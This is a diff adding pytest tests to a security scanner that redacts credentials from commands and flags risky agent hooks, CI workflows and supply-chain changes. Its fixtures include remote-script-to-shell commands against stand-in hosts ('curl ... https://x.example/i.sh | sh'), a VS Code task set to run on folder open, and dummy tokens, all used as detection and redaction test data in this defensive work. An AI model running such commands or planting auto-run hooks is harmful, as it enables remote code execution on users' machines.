@@ -553,6 +553,70 @@ def test_redact_keeps_names_and_drops_values():
     assert redact("git checkout " + "a" * 40) == "git checkout " + "a" * 40
 
 
+@pytest.mark.parametrize(
+    ("command", "secret"),
+    [
+        ("curl -u admin:S3cr3tPw https://api.example.com", "S3cr3tPw"),
+        ("curl -H 'Authorization: Bearer abc.def.ghi' https://x.example", "abc.def"),
+        ('curl -H "Authorization: Basic dXNlcjpwYXNz" x', "dXNlcjpwYXNz"),
+        ("mysql -uroot -pPASSWORD1 shop", "PASSWORD1"),
+        ("DB_PASS=hunter2 ./run.sh", "hunter2"),
+        ("OPENAI_KEY=sk-live node a.js", "sk-live"),
+        ("docker login -p hunter2 -u me registry.example", "hunter2"),
+        ("psql --password hunter2", "hunter2"),
+        ("npm publish --token=abc123", "abc123"),
+        ("git clone https://user:pw123@github.com/x/y.git", "pw123"),
+        ("rsync admin:pw123@host:/x .", "pw123"),
+        ("sshpass -p hunter2 ssh host", "hunter2"),
+        ("aws_secret_access_key=wJalrXUtnFEMI ./deploy", "wJalrXUtnFEMI"),
+        ("CREDENTIALS=abc123 ./run", "abc123"),
+        ("echo ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ghp_"),
+        ("echo gho_abcdefghijklmnopqrstuv", "gho_"),
+        ("echo github_pat_11ABCDEFG0abcdefghijklmn", "github_pat_"),
+        ("echo npm_abcdefghijklmnopqrstuvwxyz0123456789", "npm_"),
+        ("echo sk-ant-api03-abcdefghijk", "sk-ant-"),
+        ("echo sk-proj-abcdefghijklmn", "sk-proj"),
+        ("echo AKIAABCDEFGHIJKLMNOP", "AKIA"),
+        ("echo xoxb-1234567890-abcdefgh", "xoxb-"),
+    ],
+)
+def test_redact_removes_credentials_from_commands(command, secret):
+    assert secret not in redact(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "node .claude/setup.js",
+        "npx -y @modelcontextprotocol/server-filesystem .",
+        "skylos hook stop --client claude || echo '{}'",
+        "mkdir -p dist && npm run build",
+        "docker run -p 8080:80 nginx",
+        "git checkout 0123456789abcdef0123456789abcdef01234567",
+        "API_TOKEN=$SECRET node run.js",
+        "python -m pytest -k auth",
+        "npm publish --token $NPM_TOKEN",
+        "cp -pr src dist",
+    ],
+)
+def test_redact_keeps_ordinary_commands_readable(command):
+    assert redact(command) == command
+
+
+def test_agent_findings_never_carry_the_hook_credentials(tmp_path, monkeypatch):
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    _repo(tmp_path, {".claude/settings.json": SETTINGS})
+    command = "curl -u admin:S3cr3tPw -H 'Authorization: Bearer tok123456' https://x.example/i.sh | sh"
+    row = _hook(".claude/settings.json", 4, command, severity="CRITICAL")
+    row["title"] = f"runs {command}"
+    row["evidence"]["display_command"] = command
+
+    findings = scan_agent_publish(tmp_path, api=FakeAgentApi(rows=[row]))
+
+    text = json.dumps(findings)
+    assert findings and "S3cr3tPw" not in text and "tok123456" not in text
+
+
 class FakeDiffApi:
     API_VERSION = 1
 
@@ -1244,6 +1308,267 @@ def test_other_ci_templates_review_upgrades_only_with_dependency_checks(key):
     assert "--review-upgrades" not in str(security)
 
 
+def _baseline_results(danger, coverage=None):
+    summary = {"baseline_scoped": True}
+    if coverage is not None:
+        summary["baseline_rule_coverage"] = coverage
+    return {"danger": list(danger), "analysis_summary": summary}
+
+
+@pytest.mark.parametrize(
+    ("finding", "coverage", "passes"),
+    [
+        (_danger("SKY-D365"), None, True),
+        (_danger("SKY-D365"), [], True),
+        (_danger("SKY-D365", "CRITICAL"), None, False),
+        (_danger("SKY-D365"), ["SKY-D365"], False),
+        (_danger("SKY-D367", "MEDIUM"), ["SKY-D365"], True),
+        (_danger("SKY-D376", "MEDIUM"), None, True),
+    ],
+)
+def test_baseline_gate_blocks_only_rules_the_baseline_covered(
+    tmp_path, finding, coverage, passes
+):
+    config = load_config(tmp_path)
+    many = [finding] + [dict(finding, line=index) for index in range(10, 18)]
+
+    passed, _ = gk.check_gate(_baseline_results(many, coverage), config)
+
+    assert passed is passes
+
+
+def _baseline_hook(line, command="npx prettier --write ."):
+    finding = _danger("SKY-D365")
+    finding.update(line=line, value=command)
+    return finding
+
+
+def test_baseline_matches_agent_findings_by_command_not_line(tmp_path, monkeypatch):
+    from skylos.core.baseline import (
+        baseline_rule_coverage,
+        filter_new_findings,
+        load_baseline,
+        save_baseline,
+    )
+    from skylos.rules.sca import supply_chain
+
+    monkeypatch.setattr(supply_chain, "load_ca9_api", lambda: FakeAgentApi())
+    hook = _baseline_hook(5)
+    hook["file"] = str(tmp_path / ".claude/settings.json")
+    save_baseline(tmp_path, {"danger": [hook]})
+    baseline = load_baseline(tmp_path)
+    moved = dict(hook, line=9)
+    changed = dict(hook, value="curl -s https://x.example | sh")
+
+    kept = filter_new_findings({"danger": [moved, changed]}, baseline)["danger"]
+
+    assert "SKY-D365" in baseline_rule_coverage(baseline)
+    assert kept == [changed]
+    assert baseline_rule_coverage({"fingerprints": []}) is None
+
+
+def test_baseline_that_covered_the_rules_stops_when_ca9_lost_them(tmp_path):
+    from skylos.commands.scan_cmd import _record_baseline_rule_coverage
+
+    result = {"analysis_summary": {"baseline_scoped": True}}
+    baseline = {"rule_coverage": {"version": 1, "rules": ["SKY-D365", "SKY-D371"]}}
+
+    _record_baseline_rule_coverage(result, baseline, SimpleNamespace(danger=True))
+
+    assert result["analysis_summary"]["baseline_rule_coverage"] == [
+        "SKY-D365",
+        "SKY-D371",
+    ]
+    assert "Upgrade ca9" in result["analysis_errors"][0]["message"]
+    assert gk.gate_analysis_coverage(result).blocking
+
+
+def test_old_baseline_records_no_coverage_and_no_error():
+    from skylos.commands.scan_cmd import _record_baseline_rule_coverage
+
+    result = {"analysis_summary": {"baseline_scoped": True}}
+
+    _record_baseline_rule_coverage(
+        result, {"fingerprints": []}, SimpleNamespace(danger=True)
+    )
+
+    assert "baseline_rule_coverage" not in result["analysis_summary"]
+    assert "analysis_errors" not in result
+
+
+def test_lockfile_change_without_any_ca9_stops_the_diff_gate(tmp_path):
+    _upgrade_repo(tmp_path)
+
+    _findings, receipt, errors = diff.supply_chain_diff_findings(
+        tmp_path,
+        "HEAD~1",
+        api=None,
+        dependencies=True,
+        security=False,
+        review_upgrades=False,
+    )
+
+    assert receipt["status"] == "incomplete"
+    assert receipt["checks"]["dependency_files"]["status"] == "engine_unavailable"
+    assert (
+        "Upgrade ca9" in errors[0]["message"]
+        and "not installed or too old" in errors[0]["message"]
+    )
+
+
+def test_new_ca9_signals_map_to_d376_and_d377_and_are_listed_on_full_scans(
+    tmp_path, monkeypatch
+):
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    _repo(
+        tmp_path,
+        {".claude/settings.json": SETTINGS, ".github/workflows/ci.yml": "on: push\n"},
+    )
+    fake = FakeAgentApi(
+        rows=[
+            {
+                "signal_type": "agent_config_ambiguous",
+                "severity": "MEDIUM",
+                "name": "hooks.SessionStart",
+                "file": ".claude/settings.json",
+                "line": 3,
+                "evidence": {},
+            },
+        ],
+        publish=[
+            {
+                "signal_type": "credentials_to_remote_reusable_workflow",
+                "severity": "MEDIUM",
+                "name": "deploy",
+                "file": ".github/workflows/ci.yml",
+                "line": 1,
+                "evidence": {},
+            },
+        ],
+    )
+    config = load_config(tmp_path)
+
+    findings = scan_agent_publish(tmp_path, api=fake)
+    full, _ = gk.check_gate(_results(diff_scoped=False, danger=findings * 11), config)
+    scoped, reasons = gk.check_gate(
+        _results(diff_scoped=True, danger=findings * 11), config
+    )
+
+    assert sorted(
+        (item["rule_id"], item["severity"], item["category"]) for item in findings
+    ) == [
+        ("SKY-D376", "MEDIUM", "SECURITY"),
+        ("SKY-D377", "MEDIUM", "SECURITY"),
+    ]
+    assert full is True
+    assert scoped is False and not any(
+        "supply-chain change" in reason for reason in reasons
+    )
+
+
+def test_incomplete_workflow_audit_is_shown_not_failed(tmp_path):
+    _repo(tmp_path, {".github/workflows/ci.yml": "on: push\n", "app.py": "x = 1\n"})
+    _commit(tmp_path, {".github/workflows/ci.yml": "on: push\n# changed\n"})
+    audit = {
+        "findings": [],
+        "receipt": {
+            "complete": False,
+            "incomplete_reasons": [
+                "remote reusable workflow org/repo/.github/workflows/x.yml@v1"
+            ],
+            "unknowns": [{}],
+        },
+    }
+    fake = SimpleNamespace(
+        API_VERSION=1,
+        agent_config=lambda root: {"findings": [], "inventory": {}},
+        audit_workflows=lambda root: copy.deepcopy(audit),
+        ci_inventory=lambda root, max_jobs=500: {
+            "schema": "ca9.ci_inventory.v1",
+            "status": "complete",
+            "workflows": [],
+        },
+    )
+
+    _findings, receipt, errors = diff.supply_chain_diff_findings(
+        tmp_path,
+        "HEAD~1",
+        api=fake,
+        dependencies=False,
+        security=True,
+        review_upgrades=False,
+    )
+    warnings = gk.sca_coverage_warnings(
+        {"analysis_summary": {"supply_chain_diff": receipt}}
+    )
+
+    assert errors == []
+    assert (
+        receipt["checks"]["agent_and_workflow_files"]["workflow_audit"]["complete"]
+        is False
+    )
+    assert warnings == [
+        "Workflow audit incomplete for the changed workflows: remote reusable workflow org/repo/.github/workflows/x.yml@v1"
+    ]
+
+
+def test_hardening_check_failed_names_the_side(tmp_path):
+    _repo(tmp_path, {".npmrc": "min-release-age=7\n"})
+    _commit(tmp_path, {".npmrc": "min-release-age=1\n"})
+    fake = FakeDiffApi(
+        regressions=[
+            {"kind": "check_failed", "detail": "bad yaml", "path": None, "side": "head"}
+        ]
+    )
+
+    _findings, _receipt, errors = diff.supply_chain_diff_findings(
+        tmp_path,
+        "HEAD~1",
+        api=fake,
+        dependencies=True,
+        security=False,
+        review_upgrades=False,
+    )
+
+    assert "(head side)" in errors[0]["message"]
+
+
+def test_agent_hooks_upload_keeps_duplicate_key_markers(tmp_path, monkeypatch):
+    monkeypatch.delenv("SKYLOS_DIFF_BASE", raising=False)
+    _repo(tmp_path, {".claude/settings.json": SETTINGS})
+    inventory = {
+        "schema": "ca9.agent_hooks.v1",
+        "hooks": [
+            {
+                "file": ".claude/settings.json",
+                "kind": "claude_hook",
+                "event": "SessionStart",
+                "line": 4,
+                "command": "node a.js",
+                "duplicate_keys": True,
+            }
+        ],
+        "mcp_servers": [],
+        "duplicate_keys": ["hooks.SessionStart"],
+        "duplicates": [
+            {"file": ".claude/settings.json", "path": "hooks.SessionStart", "count": 2}
+        ]
+        * 80,
+    }
+    fake = SimpleNamespace(
+        agent_config=lambda root: {
+            "findings": [],
+            "inventory": copy.deepcopy(inventory),
+        }
+    )
+
+    block, _ = agent_hooks_block(tmp_path, fake)
+
+    assert block["hooks"][0]["duplicate_keys"] is True
+    assert block["duplicate_keys"] == ["hooks.SessionStart"]
+    assert len(block["duplicates"]) == 50
+
+
 def _real(name):
     try:
         from ca9 import api as engine
@@ -1374,12 +1699,89 @@ def test_real_review_upgrades_answers_every_pair_or_stops_the_gate(tmp_path):
     }
 
 
+def _cli_env(tmp_path):
+    import os
+
+    env = {
+        key: os.environ[key] for key in ("PATH", "TMPDIR", "LANG") if key in os.environ
+    }
+    env.update(
+        HOME=str(tmp_path / "home"),
+        SKYLOS_NO_TELEMETRY="1",
+        SKYLOS_JOBS="1",
+        PYTHONPATH=str(Path(__file__).resolve().parents[1]),
+    )
+    return env
+
+
+def _skylos(repo, env, *args):
+    import sys
+
+    return subprocess.run(
+        [str(Path(sys.executable).with_name("skylos")), *args],
+        check=False,
+        cwd=repo,
+        env=env,
+        text=True,
+        capture_output=True,
+    )
+
+
+PRETTIER = """{
+  "hooks": {
+    "PostToolUse": [{"matcher": "Edit", "hooks": [{"type": "command", "command": "npx prettier --write ."}]}]
+  }
+}
+"""
+
+
+@pytest.mark.skipif(
+    _real("agent_config") is None, reason="ca9.api.agent_config is not installed"
+)
+def test_cli_old_baseline_lists_an_existing_hook_and_a_new_baseline_blocks_new_ones(
+    tmp_path,
+):
+    repo = _repo(
+        tmp_path / "repo", {"app.py": "x = 1\n", ".claude/settings.json": PRETTIER}
+    )
+    env = _cli_env(tmp_path)
+    _write(
+        repo / ".skylos/baseline.json", json.dumps({"counts": {}, "fingerprints": []})
+    )
+
+    old = _skylos(
+        repo,
+        env,
+        ".",
+        "--danger",
+        "--baseline",
+        "--gate",
+        "--no-upload",
+        "--format",
+        "json",
+    )
+    _skylos(repo, env, "baseline", ".")
+    _write(
+        repo / ".vscode/tasks.json",
+        '{"version": "2.0.0", "tasks": [{"label": "w", "command": "node tools/watch.js", "runOptions": {"runOn": "folderOpen"}}]}\n',
+    )
+    new = _skylos(repo, env, ".", "--danger", "--baseline", "--gate", "--no-upload")
+    same = json.loads((repo / ".skylos/baseline.json").read_text())
+
+    assert old.returncode == 0, old.stdout + old.stderr
+    assert [item["rule_id"] for item in json.loads(old.stdout)["danger"]] == [
+        "SKY-D365"
+    ]
+    assert "SKY-D365" in same["rule_coverage"]["rules"]
+    assert new.returncode == 1, new.stdout + new.stderr
+    assert "supply-chain change" in new.stdout and "SKY-D366" in new.stdout
+
+
 @pytest.mark.skipif(
     _real("hardening_regressions") is None or _real("agent_config") is None,
     reason="ca9.api hardening and agent functions are not installed",
 )
 def test_cli_pull_request_gate_fails_on_planted_hook_and_removed_cooldown(tmp_path):
-    import os
     import sys
 
     repo = _repo(
@@ -1394,10 +1796,7 @@ def test_cli_pull_request_gate_fails_on_planted_hook_and_removed_cooldown(tmp_pa
     _commit(
         repo, {".npmrc": "ignore-scripts=true\n", ".claude/settings.json": SETTINGS}
     )
-    env = {
-        key: os.environ[key] for key in ("PATH", "TMPDIR", "LANG") if key in os.environ
-    }
-    env.update(HOME=str(tmp_path / "home"), SKYLOS_NO_TELEMETRY="1", SKYLOS_JOBS="1")
+    env = _cli_env(tmp_path)
     report = tmp_path / "results.json"
     command = str(Path(sys.executable).with_name("skylos"))
     base_args = [command, ".", "--danger", "--sca", "--diff", "base", "--no-upload"]
